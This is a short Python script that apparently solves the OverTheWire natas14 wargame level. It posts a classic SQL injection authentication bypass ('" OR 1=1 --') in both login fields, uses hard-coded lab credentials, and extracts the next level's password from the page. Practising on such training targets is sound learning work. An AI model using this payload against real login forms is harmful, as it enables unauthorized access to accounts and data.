#!/usr/bin/env python3

import requests
import re

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org' % username

data = {
    'username': '" OR 1=1 --',
    'password': '" OR 1=1 --'
}
response = requests.post(url, auth=(username, password), data=data)
content = response.text

flag = re.findall('Successful login! The password for natas15 is (.*)<br>', content)[0]

print(flag)